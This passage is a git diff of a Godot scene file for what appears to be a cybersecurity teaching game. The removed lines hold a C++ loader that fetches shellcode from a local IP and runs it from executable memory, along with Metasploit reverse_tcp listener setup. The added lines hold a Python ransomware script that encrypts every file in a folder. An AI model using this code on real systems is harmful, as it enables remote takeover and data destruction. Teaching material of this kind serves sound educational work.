@@ -1,11 +1,11 @@
-[gd_scene load_steps=55 format=3 uid="uid://dnj8fsi1dawwb"]
+[gd_scene load_steps=52 format=3 uid="uid://udgywv3oh8ed"]
 
-[ext_resource type="Script" uid="uid://5e1pg0h8twbo" path="res://Scenes/GUI/CyberattacksV2/FilelessV2/fileless.gd" id="1_q0tlf"]
-[ext_resource type="FontFile" uid="uid://bbhvwm260bx4g" path="res://Assets/Fonts/avantgarde_demi.ttf" id="2_qxdw1"]
-[ext_resource type="FontFile" uid="uid://c4mm3of2mc8o5" path="res://addons/phantom_camera/fonts/Nunito-Black.ttf" id="3_oducy"]
-[ext_resource type="Script" uid="uid://dymocqk677j5n" path="res://Scripts/GUI/code_edit_window.gd" id="4_dsue1"]
-[ext_resource type="PackedScene" uid="uid://cbqaj2456biy" path="res://Scenes/GUI/next_button.tscn" id="5_evr5x"]
-[ext_resource type="PackedScene" uid="uid://cfnlekhp378nk" path="res://Scenes/GUI/back_button.tscn" id="6_l34d4"]
+[ext_resource type="Script" uid="uid://ckfxgu1kkib3k" path="res://Scripts/GUI/code_editor_ui.gd" id="1_fliea"]
+[ext_resource type="FontFile" uid="uid://bbhvwm260bx4g" path="res://Assets/Fonts/avantgarde_demi.ttf" id="2_5p0s0"]
+[ext_resource type="FontFile" uid="uid://c4mm3of2mc8o5" path="res://addons/phantom_camera/fonts/Nunito-Black.ttf" id="3_rwdno"]
+[ext_resource type="Script" uid="uid://dymocqk677j5n" path="res://Scripts/GUI/code_edit_window.gd" id="4_mk2dp"]
+[ext_resource type="PackedScene" uid="uid://cbqaj2456biy" path="res://Scenes/GUI/next_button.tscn" id="5_e0kck"]
+[ext_resource type="PackedScene" uid="uid://cfnlekhp378nk" path="res://Scenes/GUI/back_button.tscn" id="6_p3rr4"]
 
 [sub_resource type="StyleBoxFlat" id="StyleBoxFlat_t4n35"]
 content_margin_left = 19.0
@@ -21,7 +21,7 @@ corner_radius_bottom_right = 15
 corner_radius_bottom_left = 15
 
 [sub_resource type="FontVariation" id="FontVariation_h8m8q"]
-base_font = ExtResource("3_oducy")
+base_font = ExtResource("3_rwdno")
 
 [sub_resource type="DPITexture" id="DPITexture_pkbn6"]
 _source = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\"><path fill=\"none\" stroke=\"#b2b2b2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-opacity=\".45\" stroke-width=\"2\" d=\"m5 7 3 3 3-3\"/></svg>
@@ -52,7 +52,7 @@ _source = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\">
 [sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_de0th"]
 
 [sub_resource type="FontVariation" id="FontVariation_31cwg"]
-base_font = ExtResource("3_oducy")
+base_font = ExtResource("3_rwdno")
 
 [sub_resource type="Theme" id="Theme_x5n46"]
 FoldableContainer/colors/collapsed_font_color = Color(1, 1, 1, 1)
@@ -124,149 +124,39 @@ void fragment() {
 resource_local_to_scene = true
 shader = SubResource("Shader_wwpmy")
 shader_parameter/rect_color = Color(0, 0, 0, 0.505882)
-shader_parameter/hole_position = Vector2(0.025, -0.2)
-shader_parameter/hole_size = Vector2(3.7, 1.865)
+shader_parameter/hole_position = Vector2(0.135, 0.135)
+shader_parameter/hole_size = Vector2(3.025, 0.26)
 
-[sub_resource type="Animation" id="Animation_avoq8"]
-resource_name = "fileless_10"
+[sub_resource type="Animation" id="Animation_i7g13"]
+length = 0.001
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["STEP 3: BOILERPLATE"]
+"values": [""]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
 tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["It reserves executable memory, copies the shellcode into it, and then runs that shellcode like a program.
-
-We are all done here, let's compile this into our terminal to generate our boilerplate.exe"]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["#include <iostream>
-#include <cpr/cpr.h>
-#include <windows.h>
-
-int main() {
-	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
-	cpr::Response r = cpr::Get(cpr::Url{ \"http://192.168.56.102/home\" });
-	char* memBuffer = NULL;
-	memBuffer = (char *)r.text.c_str(); 
-	
-	unsigned char shellcode[382];
-	memBuffer += 2; 
-	for (size_t count = 0; count < sizeof shellcode - 1; count++) { 
-		sscanf_s(memBuffer, \"%02hhx\", &shellcode[count]); 
-		memBuffer = memBuffer + 4;
-	}
-
-	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, 
- PAGE_EXECUTE_READWRITE);
-    memcpy(exec, shellcode, sizeof shellcode);
-    ((void(*)())exec)();
-}"]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
 "values": [true]
 }
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(3.7, 1.865), Vector2(3.47, 1.95)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(0.025, -0.2), Vector2(0.025, 1.91)]
-}
-tracks/6/type = "value"
-tracks/6/imported = false
-tracks/6/enabled = true
-tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
-tracks/6/interp = 1
-tracks/6/loop_wrap = true
-tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [13.999999999999998]
-}
-
-[sub_resource type="Animation" id="Animation_7q661"]
-resource_name = "fileless_11"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["STEP 5: LISTENER"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["Now we need to setup our listener"]
-}
 tracks/2/type = "value"
 tracks/2/imported = false
 tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
@@ -278,587 +168,307 @@ tracks/2/keys = {
 tracks/3/type = "value"
 tracks/3/imported = false
 tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Creating an encryption code"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 0.135)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.26)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+tracks/7/type = "value"
+tracks/7/imported = false
+tracks/7/enabled = true
+tracks/7/path = NodePath("WindowBackground/Window/WindowContents/MarginContainer/SampleContent:visible")
+tracks/7/interp = 1
+tracks/7/loop_wrap = true
+tracks/7/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/8/type = "value"
+tracks/8/imported = false
+tracks/8/enabled = true
+tracks/8/path = NodePath("WindowBackground/Window/WindowContents/WindowHeader/SampleHeader:text")
+tracks/8/interp = 1
+tracks/8/loop_wrap = true
+tracks/8/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Wow header"]
+}
+tracks/9/type = "value"
+tracks/9/imported = false
+tracks/9/enabled = true
+tracks/9/path = NodePath("WindowBackground/Window/WindowContents/MarginContainer/ProgressBar:value")
+tracks/9/interp = 1
+tracks/9/loop_wrap = true
+tracks/9/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+tracks/10/type = "value"
+tracks/10/imported = false
+tracks/10/enabled = true
+tracks/10/path = NodePath("WindowBackground:visible")
+tracks/10/interp = 1
+tracks/10/loop_wrap = true
+tracks/10/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
 "values": [false]
 }
 
-[sub_resource type="Animation" id="Animation_4xa5g"]
-resource_name = "fileless_12"
+[sub_resource type="Animation" id="Animation_oekl0"]
+resource_name = "ransomware_step_01"
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["STEP 5: LISTENER"]
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
 tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["Let's run metasploit using this command"]
+"values": [true]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
 tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["root@DESKTOP-123ABC:~$ msfconsole"]
+"values": ["First, the program imports two important tools: \"os\\\" 
+This lets the program interact with the computer’s files and folders. Think of it as a helper that can look inside directories, check whether something is a file, and manage paths."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
 tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": [true]
+"values": ["Importing the Tools"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
 tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
 tracks/4/interp = 1
 tracks/4/loop_wrap = true
 tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.1, 0.26), Vector2(2.855, 0.32)]
+"values": [Vector2(0.135, 0.135)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
 tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
 tracks/5/interp = 1
 tracks/5/loop_wrap = true
 tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.015, -0.06), Vector2(0.015, 0.095)]
+"values": [Vector2(3.025, 0.26)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
 }
 
-[sub_resource type="Animation" id="Animation_fisl7"]
-resource_name = "fileless_13"
+[sub_resource type="Animation" id="Animation_k4s4l"]
+resource_name = "ransomware_step_02"
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["STEP 5: LISTENER"]
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
 tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [" This module doesn’t exploit anything — it just waits (listens) for a payload to connect back. 
-
- Perfect for catching a reverse_tcp payload you made with msfvenom."]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["root@DESKTOP-123ABC:~$ msfconsole
-msf6 > use exploit/multi/handler"]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
 "values": [true]
 }
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(2.855, 0.32), Vector2(2.5, 0.32)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(0.015, 0.095), Vector2(0.015, 0.425)]
-}
-
-[sub_resource type="Animation" id="Animation_sb7b7"]
-resource_name = "fileless_14"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["STEP 5: LISTENER"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["Matches the payload type you generated earlier — this is critical.
-
- If the payload you made in msfvenom is windows/meterpreter/reverse_tcp, this must be the same here"]
-}
 tracks/2/type = "value"
 tracks/2/imported = false
 tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["root@DESKTOP-123ABC:~$ msfconsole
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD => windows/meterpreter/reverse_tcp"]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(2.5, 0.32), Vector2(3.81, 0.99)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(0.015, 0.425), Vector2(0.015, 0.725)]
-}
-
-[sub_resource type="Animation" id="Animation_jsba4"]
-resource_name = "fileless_15"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["STEP 5: LISTENER"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["This should be the IP address of your attacking machine on the same network as the target.
-
-Must match the LHOST you used in msfvenom."]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["root@DESKTOP-123ABC:~$ msfconsole
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD => windows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
-LHOST => 192.168.56.102"]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(3.81, 0.99), Vector2(2.965, 0.99)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(0.015, 0.725), Vector2(0.015, 1.645)]
-}
-
-[sub_resource type="Animation" id="Animation_72txf"]
-resource_name = "fileless_16"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["STEP 5: LISTENER"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["Same as above — this needs to match the LPORT from your generated payload."]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["root@DESKTOP-123ABC:~$ msfconsole
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD => windows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
-LHOST => 192.168.56.102
-msf6 exploit(multi/handler) >  set LPORT 8000
-LPORT => 8000"]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(2.965, 0.99), Vector2(3.335, 0.685)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(0.015, 1.645), Vector2(0.015, 2.585)]
-}
-
-[sub_resource type="Animation" id="Animation_35c0o"]
-resource_name = "fileless_17"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["STEP 5: LISTENER"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["This will display a table of all configurable arguments for the chosen payload"]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["root@DESKTOP-123ABC:~$ msfconsole
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD => windows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
-LHOST => 192.168.56.102
-msf6 exploit(multi/handler) >  set LPORT 8000
-LPORT => 8000
-msf6 exploit(multi/handler) > show options"]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
